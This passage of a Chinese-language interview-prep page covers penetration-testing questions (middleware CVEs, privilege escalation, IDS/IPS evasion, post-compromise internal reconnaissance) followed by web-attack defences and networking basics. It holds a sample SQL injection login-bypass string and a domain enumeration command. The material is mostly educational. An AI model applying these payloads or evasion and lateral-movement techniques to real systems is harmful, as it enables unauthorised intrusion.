<li>XXE盲打 </li>
<li>SSRF盲打</li>
</ul>
<h2 id="59-HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie"><a href="#59-HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie" class="headerlink" title="59.HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie"></a>59.HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie</h2><p>劫持登录页面钓鱼绕过</p>
<h2 id="60-中间件漏洞总结？"><a href="#60-中间件漏洞总结？" class="headerlink" title="60.中间件漏洞总结？"></a>60.中间件漏洞总结？</h2><p><strong>这里只写常利用的漏洞</strong></p>
<ul>
<li>IIS:<ul>
<li>IIS6.0 PUT漏洞 </li>
<li>IIS6.0 远程代码执行漏洞 </li>
<li>IIS6.0 解析漏洞 IIS启用.net 短文件名漏洞 </li>
<li>IIS7.0&#x2F;7.5 解析漏洞</li>
</ul>
</li>
<li>Apache:<ul>
<li>未知扩展名解析漏洞 </li>
<li>配合错误导致的解析漏洞、目录遍历</li>
</ul>
</li>
<li>Nginx：<ul>
<li>配置错误导致的解析漏洞、目录遍历</li>
</ul>
</li>
<li>Tomcat:<ul>
<li>配置错误导致的任意代码执行、任意文件写入漏洞 </li>
<li>弱口令+管理后台war包部署getshell </li>
<li>manager&#x2F;html管理后台弱口令爆破</li>
</ul>
</li>
<li>JBoss:<ul>
<li>5.x&#x2F;6.x反序列化漏洞（CVE-2017-12149）</li>
<li>JMXInvokerServlet反序列化 </li>
<li>EJBInvokerServlet反序列化 </li>
<li>JMX Console未授权访问 </li>
<li>弱口令+管理后台war包部署getshell</li>
</ul>
</li>
<li>WebLogic:<ul>
<li>XMLDecoder 反序列化漏洞（CVE-2017-10271 &amp; CVE-2017-3506)</li>
<li>wls9_async_response,wls-wsat 反序列化远程代码执行漏洞（CVE-2019-2725） </li>
<li>WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628） </li>
<li>弱口令+管理后台war包部署getshell</li>
</ul>
</li>
</ul>
<h2 id="61-谈一谈Windows系统与Linux系统提权的思路？"><a href="#61-谈一谈Windows系统与Linux系统提权的思路？" class="headerlink" title="61.谈一谈Windows系统与Linux系统提权的思路？"></a>61.谈一谈Windows系统与Linux系统提权的思路？</h2><ul>
<li><p>Windows:</p>
<ul>
<li>数据库提权：mysql、sqlserver</li>
<li>第三方软件提权：serv-u </li>
<li>DLL劫持 </li>
<li>系统内核溢出漏洞提权：cve系列</li>
</ul>
</li>
<li><p>Linux：</p>
<ul>
<li><p>sudo提权 </p>
</li>
<li><p>suid提权 </p>
</li>
<li><p>redis </p>
</li>
<li><p>内核提权</p>
</li>
</ul>
</li>
</ul>
<h2 id="62-python有哪些框架，其中出现过哪些漏洞"><a href="#62-python有哪些框架，其中出现过哪些漏洞" class="headerlink" title="62.python有哪些框架，其中出现过哪些漏洞"></a>62.python有哪些框架，其中出现过哪些漏洞</h2><ul>
<li>Django、Flask、Scrapy </li>
<li>Django任意代码执行 </li>
<li>Flask模板注入</li>
</ul>
<h2 id="63-小程序的渗透和普通渗透的差异"><a href="#63-小程序的渗透和普通渗透的差异" class="headerlink" title="63.小程序的渗透和普通渗透的差异"></a>63.小程序的渗透和普通渗透的差异</h2><ul>
<li>渗透过程不变，依旧是抓包修改参数渗透 </li>
<li>不同点是小程序会将包下载到本地，可以使用逆向还原工具反编译</li>
</ul>
<h2 id="64-app本身的漏洞测试-四大组件"><a href="#64-app本身的漏洞测试-四大组件" class="headerlink" title="64.app本身的漏洞测试 四大组件"></a>64.app本身的漏洞测试 四大组件</h2><ul>
<li><p>Activity组件:</p>
<ul>
<li>activity绑定browserable与自定义协议 </li>
<li>ActivityManager漏洞</li>
</ul>
</li>
<li><p>Service组件:</p>
<ul>
<li>权限提升，拒绝服务攻击</li>
</ul>
</li>
<li><p>Broadcast Receiver组件:</p>
<ul>
<li>权限管理不当 </li>
<li>BroadcastReceiver导出漏洞 </li>
<li>动态注册广播组件暴露漏洞</li>
</ul>
</li>
<li><p>Content Provider组件:</p>
<ul>
<li>读写权限漏洞 </li>
<li>Content Provider中的SQL注入漏洞 </li>
<li>Provider文件目录遍历漏洞</li>
</ul>
</li>
</ul>
<h2 id="65-IDS-IPS防护原理及绕过思路"><a href="#65-IDS-IPS防护原理及绕过思路" class="headerlink" title="65.IDS&#x2F;IPS防护原理及绕过思路"></a>65.IDS&#x2F;IPS防护原理及绕过思路</h2><ul>
<li><p>原理：</p>
<p>​	IDS工作在网络层，旁路部署，通过抓取和分析网络流量来发现攻击 IPS一般也是在网络层旁路，可以理解为具备阻断能力的IDS，是IDS的升级版（也有IDS检测到攻击通知阻断设备执行阻断动作的设备联动模式），可以覆盖网络层和应用层</p>
</li>
<li><p>绕过：</p>
<ul>
<li>TCP分片：拆分出两个TCP包 </li>
<li>IP分片：原理同TCP分片，但是丢包严重 </li>
<li>程序bug&#x2F;性能问题：发送大量无效包，消耗IPS性能 </li>
<li>伪造TCP状态：绕过基于状态追踪的IPS</li>
<li>IPV6绕过：使用IPV6地址绕过</li>
</ul>
</li>
</ul>
<h2 id="66-json的csrf的利用"><a href="#66-json的csrf的利用" class="headerlink" title="66.json的csrf的利用"></a>66.json的csrf的利用</h2><p>使用XMLHttpRequest、fetch构造出JSON请求，利用Flash的跨域与307跳转来绕过http自定义头限制</p>
<h2 id="67-json格式的数据包可以测哪些漏洞"><a href="#67-json格式的数据包可以测哪些漏洞" class="headerlink" title="67.json格式的数据包可以测哪些漏洞"></a>67.json格式的数据包可以测哪些漏洞</h2><ul>
<li>csrf </li>
<li>json劫持 </li>
<li>xss</li>
</ul>
<h2 id="68、简述xxe漏洞原理"><a href="#68、简述xxe漏洞原理" class="headerlink" title="68、简述xxe漏洞原理"></a>68、简述xxe漏洞原理</h2><p>XML外部实体注入，在应用程序解析XML输入时，当允许引用外部实体时，可构造恶意内容，产生 漏洞</p>
<h2 id="69-内网服务器，如何进行信息收集？"><a href="#69-内网服务器，如何进行信息收集？" class="headerlink" title="69.内网服务器，如何进行信息收集？"></a>69.内网服务器，如何进行信息收集？</h2><ul>
<li>使用脚本收集：端口信息、服务信息 </li>
<li>系统命令收集：域内用户可使用域命令收集域信息，net group “domain users” &#x2F;domain等 </li>
<li>端口扫描工具全段扫描 </li>
<li>本机信息收集：管理密码、登录日志看管理员ip、服务密码收集、网段 信息查看、历史记录查看 </li>
<li>内网DNS域传送漏洞</li>
</ul>
<h2 id="70-如果拿下了内网边界层的某一个机器，如何对内网其-他进行探测？"><a href="#70-如果拿下了内网边界层的某一个机器，如何对内网其-他进行探测？" class="headerlink" title="70.如果拿下了内网边界层的某一个机器，如何对内网其 他进行探测？"></a>70.如果拿下了内网边界层的某一个机器，如何对内网其 他进行探测？</h2><ul>
<li>首先使用代理进入内网reg、ew等 </li>
<li>第二在本机进行信息收集，包括管理员ip、端口服务、账号密码、路由信息、网段信息等 </li>
<li>第三扩展到收集到的网段进行渗透，利用常用服务:SMB、MYSQL、SQLserver、ftp、telnet等 </li>
<li>借助轻量化脚本或扫描器扫描，但一般不这么做，动静太大容易被管理员发现</li>
</ul>
<h2 id="71-什么时SQL注入攻击"><a href="#71-什么时SQL注入攻击" class="headerlink" title="71.什么时SQL注入攻击"></a>71.什么时SQL注入攻击</h2><ul>
<li><p>攻击者在HTTP请求中注入恶意的SQL代码，服务器使用参数构建数据库SQL命令时，恶意SQL被一起构 造，并在数据库中执行。 </p>
</li>
<li><p>用户登录，输入用户名 lianggzone，密码 ‘ or ‘1’&#x3D;’1 ，如果此时使用参数构造的方式，就会出现 select * from user where name &#x3D; ‘lianggzone’ and password &#x3D; ‘’ or ‘1’&#x3D;‘1’ 不管用户名和密码是什么内容，使查询出来的用户列表不为空。如何防范SQL注入攻击使用预编译的 PrepareStatement是必须的，但是一般我们会从两个方面同时入手。 </p>
</li>
<li><p>Web端： </p>
<ul>
<li>有效性检验。 </li>
<li>限制字符串输入的长度。</li>
</ul>
</li>
<li><p>服务端 ：</p>
<ul>
<li>不用拼接SQL字符串。</li>
<li>使用预编译的PrepareStatement。 </li>
<li>有效性检验。(为什么服务端还要做有效性检验？第一准则，外部都是不可信的，防止攻击者绕过 Web端请求) </li>
<li>过滤SQL需要的参数中的特殊字符。比如单引号、双引号。</li>
</ul>
</li>
</ul>
<h2 id="72-什么是XSS攻击"><a href="#72-什么是XSS攻击" class="headerlink" title="72.什么是XSS攻击"></a>72.什么是XSS攻击</h2><p>跨站点脚本攻击，指攻击者通过篡改网页，嵌入恶意脚本程序，在用户浏览网页时，控制用户浏览器进 行恶意操作的一种攻击方式。</p>
<ul>
<li>如何防范XSS攻击 ：<ul>
<li>前端，服务端，同时需要字符串输入的长度限制。 </li>
<li>前端，服务端，同时需要对HTML转义处理。将其中的”&lt;”,”&gt;”等特殊字符进行转义编码。 防 XSS 的核心是必须对输入的数据做过滤处理。</li>
</ul>
</li>
</ul>
<h2 id="73-什么是CSRF攻击"><a href="#73-什么是CSRF攻击" class="headerlink" title="73.什么是CSRF攻击"></a>73.什么是CSRF攻击</h2><p>跨站点请求伪造，指攻击者通过跨站请求，以合法的用户的身份进行非法操作。</p>
<p>可以这么理解CSRF攻 击：攻击者盗用你的身份，以你的名义向第三方网站发送恶意请求。CRSF能做的事情包括利用你的身份 发邮件，发短信，进行交易转账，甚至盗取账号信息。</p>
<ul>
<li><p>如何防范CSRF攻击：</p>
<ul>
<li><p>安全框架，例如Spring Security。  </p>
</li>
<li><p>token机制，在HTTP请求中进行token验证，如果请求中没有token或者token内容不正确，则认为CSRF 攻击而拒绝该请求。 </p>
</li>
<li><p>验证码。通常情况下，验证码能够很好的遏制CSRF攻击，但是很多情况下，出于用户体验考虑，验证码 只能作为一种辅助手段，而不是最主要的解决方案。 </p>
</li>
<li><p>referer识别。在HTTP Header中有一个字段Referer，它记录了HTTP请求的来源地址。如果Referer是 其他网站，就有可能是CSRF攻击，则拒绝该请求。但是，服务器并非都能取到Referer。很多用户出于 隐私保护的考虑，限制了Referer的发送。在某些情况下，浏览器也不会发送Referer，例如HTTPS跳转 到HTTP。 </p>
</li>
<li><p>验证请求来源地址； </p>
</li>
<li><p>关键操作添加验证码； </p>
</li>
<li><p>在请求地址添加 token 并验证。</p>
</li>
</ul>
</li>
</ul>
<h2 id="74-什么是文件上传漏洞"><a href="#74-什么是文件上传漏洞" class="headerlink" title="74.什么是文件上传漏洞"></a>74.什么是文件上传漏洞</h2><p>文件上传漏洞，指的是用户上传一个可执行的脚本文件，并通过此脚本文件获得了执行服务端命令的能 力。 </p>
<p>许多第三方框架、服务，都曾经被爆出文件上传漏洞，比如很早之前的Struts2，以及富文本编辑器等 等，可被攻击者上传恶意代码，有可能服务端就被人黑了。</p>
<ul>
<li>如何防范文件上传漏洞 文件上传的目录设置为不可执行。 <ul>
<li>判断文件类型。在判断文件类型的时候，可以结合使用MIME Type，后缀检查等方式。因为对于上 传文件，不能简单地通过后缀名称来判断文件的类型，因为攻击者可以将可执行文件的后缀名称改为图 片或其他后缀类型，诱导用户执行。 </li>
<li>对上传的文件类型进行白名单校验，只允许上传可靠类型。 </li>
<li>上传的文件需要进行重新命名，使攻击者无法猜想上传文件的访问路径，将极大地增加攻击成本，同 时向shell.php.rar.ara这种文件，因为重命名而无法成功实施攻击。 </li>
<li>限制上传文件的大小。 </li>
<li>单独设置文件服务器的域名。</li>
</ul>
</li>
</ul>
<h2 id="75-DDos-攻击"><a href="#75-DDos-攻击" class="headerlink" title="75.DDos 攻击"></a>75.DDos 攻击</h2><p>客户端向服务端发送请求链接数据包，服务端向客户端发送确认数据包，客户端不向服务端发送确认数 据包，服务器一直等待来自客户端的确认 没有彻底根治的办法，除非不使用TCP DDos -</p>
<ul>
<li>预防：<ul>
<li>限制同时打开SYN半链接的数目 </li>
<li>缩短SYN半链接的Time out 时间 </li>
<li>关闭不必要的服务</li>
</ul>
</li>
</ul>
<h2 id="76-重要协议分布图"><a href="#76-重要协议分布图" class="headerlink" title="76.重要协议分布图"></a>76.重要协议分布图</h2><p><img src="file:///D:/%E5%9B%BE%E7%89%87/%E9%87%8D%E8%A6%81%E5%8D%8F%E8%AE%AE%E5%88%86%E5%B8%83%E5%9B%BE.png" alt="重要协议分布图"></p>
<h2 id="77-arp协议的工作原理"><a href="#77-arp协议的工作原理" class="headerlink" title="77.arp协议的工作原理"></a>77.arp协议的工作原理</h2><ul>
<li>地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP&#x2F;IP协议。<ul>
<li>发送ARP请求的以太网数据帧 广播 到以太网上的每个主机，ARP请求帧中包含了目的主机的IP地址。 </li>
<li>目的主机收到了该ARP请求之后，会发送一个ARP应答，里面包含了目的主机的MAC地址。</li>
</ul>
</li>
</ul>
<p> <strong>ARP协议工作原理：</strong></p>
<p>每个主机都会在自己的 ARP 缓冲区中建立一个 ARP 列表，以表示 IP 地址和 MAC 地址之间的对应关系。</p>
<p>主机（网络接口）新加入网络时（也可能只是mac地址发生变化，接口重启等），会发送免费ARP报文把自己IP地址与Mac地址的映射关系广播给其他主机。 </p>
<p>网络上的主机接收到免费ARP报文时，会更新自己的ARP缓冲区。将新的映射关系更新到自己的ARP表 中。 </p>
<p>某个主机需要发送报文时，首先检查 ARP 列表中是否有对应 IP 地址的目的主机的 MAC 地址，如果有， 则直接发送数据，如果没有，就向本网段的所有主机发送 ARP 数据包，该数据包包括的内容有：源主机 IP 地址，源主机 MAC 地址，目的主机的 IP 地址等。 </p>
<p><strong>当本网络的所有主机收到该 ARP 数据包时：</strong> </p>
<ol>
<li>首先检查数据包中的 IP 地址是否是自己的 IP 地址，如果不是，则忽略该数据包。 </li>
<li>如果是，则首先从数据包中取出源主机的 IP 和 MAC 地址写入到 ARP 列表中，如果已经存在，则 覆盖。 </li>
<li>然后将自己的 MAC 地址写入 ARP 响应包中，告诉源主机自己是它想要找的 MAC 地址。 6.源主机收到 ARP 响应包后。将目的主机的 IP 和 MAC 地址写入 ARP 列表，并利用此信息发送数据。 如果源主机一直没有收到 ARP 响应数据包，表示 ARP 查询失败。ARP高速缓存（即ARP表）是 ARP地址 解析协议能够高效运行的关键</li>
</ol>
<h2 id="78-什么是RARP？工作原理"><a href="#78-什么是RARP？工作原理" class="headerlink" title="78.什么是RARP？工作原理"></a>78.什么是RARP？工作原理</h2><ul>
<li>概括： 反向地址转换协议，网络层协议，RARP与ARP工作方式相反。 RARP使只知道自己硬件地址的主 机能够知道其IP地址。RARP发出要反向解释的物理地址并希望返回其IP地址，应答包括能够提供所需信 息的RARP服务器发出的IP地址。 </li>
<li>原理： <ul>
<li>网络上的每台设备都会有一个独一无二的硬件地址，通常是由设备厂商分配的MAC地址。主机从网卡 上读取MAC地址，然后在网络上发送一个RARP请求的广播数据包，请求RARP服务器回复该主机的IP地 址。 </li>
<li>RARP服务器收到了RARP请求数据包，为其分配IP地址，并将RARP回应发送给主机</li>
<li>PC1收到RARP回应后，就使用得到的IP地址进行通讯。</li>
</ul>
</li>
</ul>
<h2 id="79-dns是什么？dns的工作原理"><a href="#79-dns是什么？dns的工作原理" class="headerlink" title="79.dns是什么？dns的工作原理"></a>79.dns是什么？dns的工作原理</h2><p>将主机域名转换为ip地址，属于应用层协议，使用UDP传输。（DNS应用层协议，以前有个考官问过） </p>
<ul>
<li><p>过程： <img src="D:\图片\1.png" alt="image-20240402103621998"></p>
</li>
<li><p>总结： 浏览器缓存，系统缓存，路由器缓存，IPS服务器缓存，根域名服务器缓存，顶级域名服务器缓 存，主域名服务器缓存。 </p>
<ul>
<li>主机向本地域名服务器的查询一般都是采用递归查询。 </li>
<li>本地域名服务器向根域名服务器的查询的迭代查询。 <ul>
<li>当用户输入域名时，浏览器先检查自己的缓存中是否 这个域名映射的ip地址，有解析结束。 </li>
<li>若没命中，则检查操作系统缓存（如Windows的hosts）中有没有解析过的结果，有解析结束。 </li>
<li>若无命中，则请求本地域名服务器解析（ LDNS）。 </li>
<li>若LDNS没有命中就直接跳到根域名服务器请求解析。根域名服务器返回给LDNS一个 主域名服务器 地址。 </li>
<li>此时LDNS再发送请求给上一步返回的gTLD（ 通用顶级域）， 接受请求的gTLD查找并返回这个域名 对应的Name Server的地址 </li>
<li>Name Server根据映射关系表找到目标ip，返回给LDNS </li>
<li>LDNS缓存这个域名和对应的ip， 把解析的结果返回给用户，用户根据TTL值缓存到本地系统缓存 中，域名解析过程至此结束</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="D:\图片\dns.png" alt="image-20240402103653198"></p>
<h2 id="80-rip协议是什么？rip的工作原理"><a href="#80-rip协议是什么？rip的工作原理" class="headerlink" title="80.rip协议是什么？rip的工作原理"></a>80.rip协议是什么？rip的工作原理</h2><p>RIP动态路由选择协议（网络层协议） </p>
<p>RIP是一种基于距离矢量（Distance-Vector）算法的协议，它使用跳数（Hop Count）作为度量来衡量 到达目的网络的路由距离。RIP通过UDP报文进行路由信息的交换，使用的端口号520。</p>
<p><strong>工作原理：</strong> RIP路由协议用“更新（UNPDATES）”和“请求（REQUESTS）”这两种分组来传输信息的。每个具有RIP协 议功能的路由器每隔30秒用UDP520端口给与之直接相连的机器广播更新信息。并且在（ 用“路程段数” （即“跳数”）作为网络距离的尺度。每个路由器在）给相邻路由器发出路由信息时，都会给每个路径加 上内部距离。</p>
<p>**路由器的收敛机制： **</p>
<p>任何距离向量路由选择协议（如RIP）都有一个问题，路由器不知道网络的全局情况，路由器必须依靠相 邻路由器来获取网络的可达信息。由于路由选择更新信息在网络上传播慢，距离向量路由选择算法有一 个慢收敛问题，这个问题将导致不一致性产生。 </p>
<p><strong>RIP较少路由收敛机制带来的问题：</strong></p>
<ol>
<li>记数到无穷大机制： RIP协议允许最大跳数为15。大于15的目的地被认为是不可达。 当路径的跳数 超过15，这条路径才从路由表中删除。 </li>
<li>水平分割法： 路由器不向路径到来的方向回传此路径。当打开路由器接口后，路由器记录路径是从 哪个接口来的，并且不向此接口回传此路径。 </li>
<li>破坏逆转的水平分割法： 忽略在更新过程中从一个路由器获取的路径又传回该路由器 </li>
<li>保持定时器法： 防止路由器在路径从路由表中删除后一定的时间内（通常为180秒）接受新的路由信 息。 保证每个路由器都收到了路径不可达信息 </li>
<li>触发更新法： 当某个路径的跳数改变了，路由器立即发出更新信息，不管路由器是否到达常规信息 更新时间都发出更新信息。</li>
</ol>
<h2 id="81-RIP的缺点"><a href="#81-RIP的缺点" class="headerlink" title="81.RIP的缺点"></a>81.RIP的缺点</h2><ol>
<li>由于15跳为最大值，RIP只能应用于小规模网络</li>
<li>收敛速度慢</li>
<li>根据跳数选择的路由，不一定是最优路由</li>
</ol>
<h2 id="82-OSPF协议？-OSPF的工作原理"><a href="#82-OSPF协议？-OSPF的工作原理" class="headerlink" title="82.OSPF协议？ OSPF的工作原理"></a>82.OSPF协议？ OSPF的工作原理</h2><p>OSPF（Open Shortest Pass First,开放最短路径优先协议），是一个最常用的内部网管协议，是一个链 路状态协议。(网络层协议,) </p>
<p><strong>原理：</strong> </p>
<p>​	OSPF组播的方式在所有开启OSPF的接口发送Hello包，用来确定是否有OSPF邻居，若发现了，则建立 OSPF邻居关系，形成邻居表，之后互相发送LSA（链路状态通告）相互通告路由，形成LSDB（链路状态 数据库）。再通过SPF算法，计算最佳路径（cost最小）后放入路由表。</p>
<h2 id="83-TCP与UDP区别总结"><a href="#83-TCP与UDP区别总结" class="headerlink" title="83.TCP与UDP区别总结"></a>83.TCP与UDP区别总结</h2><ol>
<li><p>TCP面向连接（如打电话要先拨号建立连接）提供可靠的服务;UDP是无连接的，即发送数据之前不需 要建立连接，;UDP尽最大努力交付，即不保证可靠交付。（由于UDP无需建立连接，因此UDP不会引入 建立连接的时延，TCP需要在端系统中维护连接状态，比如接受和发送缓存，拥塞控制，序号与确认号 的参数等，故TCP会比UDP慢） </p>
</li>
<li><p>UDP具有较好的实时性，工作效率比TCP高，适用于对高速传输和实时性有较高的通信或广播通信。 </p>
</li>
<li><p>每一条TCP连接只能是一对一的;UDP支持一对一，一对多，多对一和多对多的交互通 </p>
</li>
<li><p>UDP分组首部开销小，TCP首部开销20字节;UDP的首部开销小，只有8个字节。 </p>
</li>
<li><p>TCP面向字节流，实际上是TCP把数据看成一连串无结构的字节流;UDP是面向报文的（一次交付一 个完整的报文，报文不可分割，报文是UDP数据报处理的最小单位）。 </p>
</li>
<li><p>UDP适合一次性传输较小数据的网络应用，如DNS，SNMP等</p>
</li>
</ol>
<h2 id="84-什么是三次握手四次挥手？tcp为什么要三次握手？"><a href="#84-什么是三次握手四次挥手？tcp为什么要三次握手？" class="headerlink" title="84.什么是三次握手四次挥手？tcp为什么要三次握手？"></a>84.什么是三次握手四次挥手？tcp为什么要三次握手？</h2><p>为了防止已失效的连接请求报文段突然又传送到了服务端，因而产生错误 </p>
<ul>
<li><p>第一次握手：建立连接时，客户端发送syn包(syn&#x3D;j)到服务器，并进入SYN_SEND状态，等待服务器确认；</p>
</li>
<li><p>第二次握手：服务器收到syn包，必须确认客户的SYN（ack&#x3D;j+1），同时自己也发送一个SYN包 （syn&#x3D;k），即SYN+ACK包，此时服务器进入SYN_RECV状态； </p>
</li>
<li><p>第三次握手：客户端收到服务器的SYN＋ACK包，向服务器发送确认包ACK(ack&#x3D;k+1)，此包发送完毕， 客户端和服务器进入ESTABLISHED状态，完成三次握手。</p>
</li>
</ul>
<p>完成三次握手，客户端与服务器开始传送数据 </p>
<p><img src="D:\图片\三次握手.png" alt="image-20240402105242397"></p>
<ul>
<li><p>客户端先发送FIN，进入FIN_WAIT1状态，用来关闭Client到Server的数据传送 </p>
</li>
<li><p>服务端收到FIN，发送ACK，进入CLOSE_WAIT状态，客户端收到这个ACK，进入FIN_WAIT2状态</p>
</li>
<li><p>服务端发送FIN，进入LAST_ACK状态，用来关闭Server到Client的数据传送 </p>
</li>
<li><p>客户端收到FIN，发送ACK，进入TIME_WAIT状态，服务端收到ACK，进入CLOSE状态（等待2MSL时 间，约4分钟。主要是防止最后一个ACK丢失。）</p>
</li>
</ul>
<p>第一次挥手：主动关闭方发送一个FIN，用来关闭主动方到被动关闭方的数据传送，也就是主动关闭方告 诉被动关闭方：我已经不 会再给你发数据了(当然，在fin包之前发送出去的数据，如果没有收到对应的 ack确认报文，主动关闭方依然会重发这些数据)，但是，此时主动关闭方还可 以接受数据。 </p>
<p>第二次挥手：被动关闭方收到FIN包后，发送一个ACK给对方，确认序号为收到序号+1（与SYN相同，一 个FIN占用一个序号）。 </p>
<p>第三次挥手：被动关闭方发送一个FIN，用来关闭被动关闭方到主动关闭方的数据传送，也就是告诉主动 关闭方，我的数据也发送完了，不会再给你发数据了。</p>
<p> 第四次挥手：主动关闭方收到FIN后，发送一个ACK给被动关闭方，确认序号为收到序号+1，至此，完成 四次挥手</p>
<p><img src="D:\图片\四次挥手.md" alt="image-20240402105325904"></p>
<h2 id="85-GET-和-POST-的区别"><a href="#85-GET-和-POST-的区别" class="headerlink" title="85.GET 和 POST 的区别"></a>85.GET 和 POST 的区别</h2><p>get是获取数据，post是修改数据 </p>
<p>get把请求的数据放在url上， 以?分割URL和传输数据，参数之间以&amp;相连，所以get不太安全。而post把 数据放在HTTP的包体内（requrest body） </p>
<ul>
<li>get提交的数据最大是2k（ 限制实际上取决于浏览器）， post理论上没有限制。 </li>
<li>GET产生一个TCP数据包，浏览器会把http header和data一并发送出去，服务器响应200(返回数据); POST产生两个TCP数据包，浏览器先发送header，服务器响应100 -continue，浏览器再发送data，服务器响应200 ok(返回数据)。 </li>
<li>GET请求会被浏览器主动缓存，而POST不会，除非手动设置。 </li>
<li>GET是幂等的，而POST不是幂等的</li>
</ul>
<h2 id="86-Cookies和session区别"><a href="#86-Cookies和session区别" class="headerlink" title="86.Cookies和session区别"></a>86.Cookies和session区别</h2><p>Cookie和Session都是客户端与服务器之间保持状态的解决方案 </p>
<ol>
<li><p>存储的位置不同，cookie：存放在客户端，session：存放在服务端。Session存储的数据比较安全 </p>
</li>
<li><p>存储的数据类型不同</p>
</li>
</ol>
<p>两者都是key-value的结构，但针对value的类型是有差异的<br>cookie：value只能是字符串类型，session：value是Object类型 </p>
<ol start="3">
<li>存储的数据大小限制不同</li>
</ol>
<p>cookie：大小受浏览器的限制，很多是是4K的大小， session：理论上受当前内存的限制， </p>
<ol start="4">
<li><p>生命周期的控制 </p>
<p>cookie的生命周期当浏览器关闭的时候，就消亡了 </p>
<ol>
<li>cookie的生命周期是累计的，从创建时，就开始计时，20分钟后，cookie生命周期结束， </li>
<li>session的生命周期是间隔的，从创建时，开始计时如在20分钟，没有访问session，那么session生 命周期被销毁</li>
</ol>
</li>
</ol>
<h2 id="87-session-的工作原理？"><a href="#87-session-的工作原理？" class="headerlink" title="87.session 的工作原理？"></a>87.session 的工作原理？</h2><p>session 的工作原理是客户端登录完成之后，服务器会创建对应的 session，session 创建完之后，会把 session 的 id 发送给客户端，客户端再存储到浏览器中。这样客户端每次访问服务器时，都会带着 sessionid，服务器拿到 sessionid 之后，在内存找到与之对应的 session 这样就可以正常工作了。</p>
<h2 id="88-一次完整的HTTP请求过程"><a href="#88-一次完整的HTTP请求过程" class="headerlink" title="88.一次完整的HTTP请求过程"></a>88.一次完整的HTTP请求过程</h2><p>域名解析 –&gt; 发起TCP的3次握手 –&gt; 建立TCP连接后发起http请求 –&gt; 服务器响应http请求，浏览器得到 html代码 –&gt; 浏览器解析html代码，并请求html代码中的资源（如js、css、图片等） –&gt; 浏览器对页面 进行渲染呈现给用户。</p>
<h2 id="89-HTTPS和HTTP的区别"><a href="#89-HTTPS和HTTP的区别" class="headerlink" title="89.HTTPS和HTTP的区别"></a>89.HTTPS和HTTP的区别</h2><ol>
<li><p>HTTP协议传输的数据都是未加密的，也就是明文的，因此使用HTTP协议传输隐私信息非常不安全， HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，要比http协议安全。 </p>
</li>
<li><p>https协议需要到ca申请证书，一般免费证书较少，因而需要一定费用。 </p>
</li>
<li><p>http和https使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443。 <a href="https://www.cnblogs.com/wqhwe/p/5407468.html">https://www.cnblogs.com/wqhwe/p/5407468.html</a></p>
</li>
</ol>
<h2 id="90-OSI-的七层模型都有哪些？"><a href="#90-OSI-的七层模型都有哪些？" class="headerlink" title="90.OSI 的七层模型都有哪些？"></a>90.OSI 的七层模型都有哪些？</h2><ul>
<li>物理层：利用传输介质为数据链路层提供物理连接，实现比特流的透明传输。 </li>
<li>数据链路层：接收来自物理层的位流形式的数据，并封装成帧，传送到上一层 </li>
<li>网络层：将网络地址翻译成对应的物理地址，并通过路由选择算法为分组通过通信子网选择最适当的路径。 </li>
<li>传输层：在源端与目的端之间提供可靠的透明数据传输 </li>
<li>会话层：负责在网络中的两节点之间建立、维持和终止通信 </li>
<li>表示层：处理用户信息的表示问题，数据的编码，压缩和解压缩，数据的加密和解密 </li>
<li>应用层：为用户的应用进程提供网络通信服务</li>
</ul>
<h2 id="91-http长连接和短连接的区别"><a href="#91-http长连接和短连接的区别" class="headerlink" title="91.http长连接和短连接的区别"></a>91.http长连接和短连接的区别</h2><p>在HTTP&#x2F;1.0中默认使用短连接。也就是说，客户端和服务器每进行一次HTTP操作，就建立一次连接， 任务结束就中断连接。而从HTTP&#x2F;1.1起，默认使用长连接，用以保持连接特性。</p>
<h2 id="92-什么是TCP粘包-拆包？-发生原因？解决方案"><a href="#92-什么是TCP粘包-拆包？-发生原因？解决方案" class="headerlink" title="92.什么是TCP粘包&#x2F;拆包？ 发生原因？解决方案"></a>92.什么是TCP粘包&#x2F;拆包？ 发生原因？解决方案</h2><p>一个完整的业务可能会被TCP拆分成多个包进行发送，也有可能把多个小的包封装 成一个大的数据包发送，这个就是TCP的拆包和粘包问题。</p>
<p>原因：<br>    1. 应用程序写入数据的字节大小大于 套接字发送缓冲区的大小.<br>    1. 进行MSS大小的TCP分段。( MSS&#x3D;TCP报文段长度-TCP首部长度)<br>    1. 以太网的 payload大于MTU进行IP分片。（ MTU指：一种通信协议的某一层上面所能通过的最大数据包大小。） </p>
<p>解决方案：<br>    1. 消息定长。<br>    2. 在包尾部增加回车或者空格符等特殊字符进行分割<br>    3. 将消息分为消息头和消 息尾。<br>    4. 使用其它复杂的协议，如RTMP协议等。</p>
<h2 id="93-TCP如何保证可靠传输？"><a href="#93-TCP如何保证可靠传输？" class="headerlink" title="93.TCP如何保证可靠传输？"></a>93.TCP如何保证可靠传输？</h2><ol>
<li>三次握手。</li>
<li>将数据截断为合理的长度。应用数据被分割成 TCP 认为最适合发送的数据块（按字节编号，合理分<br>片）</li>
<li>超时重发。当 TCP 发出一个段后，它启动一个定时器，如果不能及时收到一个确认就重发</li>
<li>确认应答：对于收到的请求，给出确认响应</li>
<li>校验和：校验出包有错，丢弃报文段，不给出响应</li>
<li>序列号：对失序数据进行重新排序，然后才交给应用层</li>
<li>丢弃重复数据：对于重复数据 ， 能够丢弃重复数据</li>
<li>流量控制。TCP 连接的每一方都有固定大小的缓冲空间。TCP 的接收端只允许另一端发送接收端缓<br>冲区所能接纳的数据。这将防止较快主机致使较慢主机的缓冲区溢出。</li>
<li>拥塞控制。当网络拥塞时，减少数据的发送。<br>校验和<br>序列号<br>确认应答<br>超时重传<br>连接管理<br>流量控制<br>拥塞控制</li>
</ol>
<h2 id="94-常见的状态码有哪些？"><a href="#94-常见的状态码有哪些？" class="headerlink" title="94.常见的状态码有哪些？"></a>94.常见的状态码有哪些？</h2><ul>
<li>200 OK &#x2F;&#x2F;客户端请求成功403 Forbidden &#x2F;&#x2F;服务器收到请求，但是拒绝提供服务 </li>
<li>404 Not Found &#x2F;&#x2F;请求资源不存在，eg：输入了错误的URL </li>
